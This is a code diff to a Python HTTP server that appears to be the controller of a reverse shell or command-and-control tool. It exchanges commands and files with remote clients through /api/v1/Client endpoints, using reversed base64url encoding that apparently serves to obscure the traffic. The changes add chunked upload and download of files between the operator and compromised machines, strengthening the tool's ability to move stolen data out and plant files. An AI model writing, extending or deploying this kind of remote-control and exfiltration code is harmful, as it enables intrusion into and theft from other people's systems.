@@ -25,6 +25,8 @@ command = None ; prompt = None
 local_path = None ; remote_path = None
 first_run = True ; wait_for_cmd = False
 neotermcolor.readline_always_safe = True
+chunk_size = 65536
+upload_chunk_buffer = {}
 
 banner = r"""
   _   _ _____ _____ ____      ____  _          _ _ 
@@ -67,10 +69,28 @@ readline.parse_and_bind("tab: complete")
 disable_pw = ("-npw" in argv)
 
 class MyServer(BaseHTTPRequestHandler):
+    _file_cache = {}
+
     def _set_headers(self, code=200):
         self.send_response(code)
         self.send_header("Content-type", "text/plain")
         self.end_headers()
+
+    def get_encoded_file(self, file_path):
+        try:
+            stat_info = os.stat(file_path)
+            key = (file_path, stat_info.st_mtime_ns, stat_info.st_size)
+            if key in MyServer._file_cache:
+                return MyServer._file_cache[key]
+            with open(file_path, "rb") as filename:
+                encoded = self.encode_file_revbase64url(filename.read())
+            if encoded is None:
+                encoded = ""
+            MyServer._file_cache.clear()
+            MyServer._file_cache[key] = encoded
+            return encoded
+        except OSError:
+            return None
 
     def encode_file_revbase64url(self, file_content):
         try:
@@ -130,7 +150,41 @@ class MyServer(BaseHTTPRequestHandler):
                         encoded_file += self.encode_file_revbase64url(file_content)
                         self._set_headers()
                         self.wfile.write(encoded_file.encode("utf-8"))
-                        print(colored(f"[+] Uploading {local_path} in {remote_path}..","green"))
+                        print(colored(f"[+] Uploaded {remote_path} successfully!", "green"))
+                except:
+                    print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
+
+            elif self.path.startswith("/api/v1/Client/DownloadChunk"):
+                try:
+                    chunk_index = 0
+                    if "?" in self.path and "index=" in self.path:
+                        query_string = self.path.split("?", 1)[1]
+                        for query_part in query_string.split("&"):
+                            if query_part.startswith("index="):
+                                chunk_index = int(query_part.split("=", 1)[1])
+                                break
+
+                    encoded_full = self.get_encoded_file(local_path)
+                    if encoded_full is None:
+                        print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
+                        self._set_headers()
+                        self.wfile.write(b"FileChunkDone")
+                        return
+
+                    start = chunk_index * chunk_size
+                    end = start + chunk_size
+                    if start >= len(encoded_full):
+                        encoded_chunk = "FileChunkDone"
+                        print(colored(f"[+] Uploaded {remote_path} successfully!", "green"))
+                    else:
+                        chunk_data = encoded_full[start:end]
+                        is_last = "1" if end >= len(encoded_full) else "0"
+                        encoded_chunk = f"FileChunk:{chunk_index}:{is_last}:{chunk_data}"
+                        if is_last == "1":
+                            print(colored(f"[+] Uploaded {remote_path} successfully!", "green"))
+
+                    self._set_headers()
+                    self.wfile.write(encoded_chunk.encode("utf-8"))
                 except:
                     print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
 
@@ -376,7 +430,10 @@ class MyServer(BaseHTTPRequestHandler):
                     last_prompt = prompt
 
             else:
-                decoded_payload = self.decode_reversed_base64url(encoded_payload)
+                if self.path in ("/api/v1/Client/Debug", "/api/v1/Client/Error"):
+                    decoded_payload = self.decode_reversed_base64url(encoded_payload)
+                else:
+                    decoded_payload = None
 
             if self.path == "/api/v1/Client/Info":
                 self.wfile.write(response.encode())
@@ -388,10 +445,46 @@ class MyServer(BaseHTTPRequestHandler):
                             file_content = self.decode_file_revbase64url(encoded_payload)
                             filename.write(file_content)
                             self.wfile.write(response.encode())
-                            print(colored(f"[+] Downloading {remote_path} in {local_path}..","green"))
+                            print(colored(f"[+] Downloaded {local_path} successfully!", "green"))
                     except:
                         print(colored(f"[!] Error writing \"{remote_path}\" file!", "red"))
                 else:
+                    print(colored(f"[!] Error downloading \"{remote_path}\" file!", "red"))
+
+            elif self.path == "/api/v1/Client/UploadChunk":
+                try:
+                    global upload_chunk_buffer
+                    _, chunk_index, is_last, chunk_payload = encoded_data.split(":", 3)
+                    chunk_index = int(chunk_index.strip())
+                    is_last = is_last.strip() == "1"
+                    chunk_payload = chunk_payload.strip()
+
+                    if chunk_index == 0:
+                        upload_chunk_buffer[local_path] = {}
+                    if local_path not in upload_chunk_buffer:
+                        upload_chunk_buffer[local_path] = {}
+
+                    upload_chunk_buffer[local_path][chunk_index] = chunk_payload
+
+                    if is_last:
+                        all_chunks = upload_chunk_buffer.get(local_path, {})
+                        ordered_indexes = sorted(all_chunks.keys())
+                        expected_indexes = list(range(len(ordered_indexes)))
+                        if ordered_indexes != expected_indexes:
+                            print(colored(f"[!] Missing chunk sequence for \"{remote_path}\" file!", "red"))
+                        else:
+                            encoded_full = "".join(all_chunks[index] for index in ordered_indexes)
+                            file_content = self.decode_file_revbase64url(encoded_full)
+                            if file_content is None:
+                                print(colored(f"[!] Error decoding \"{remote_path}\" assembled chunks!", "red"))
+                            else:
+                                with open(local_path, "wb") as filename:
+                                    filename.write(file_content)
+                                print(colored(f"[+] Downloaded {local_path} successfully!", "green"))
+                        upload_chunk_buffer.pop(local_path, None)
+
+                    self.wfile.write(response.encode())
+                except:
                     print(colored(f"[!] Error downloading \"{remote_path}\" file!", "red"))
 
             elif self.path == "/api/v1/Client/Debug":
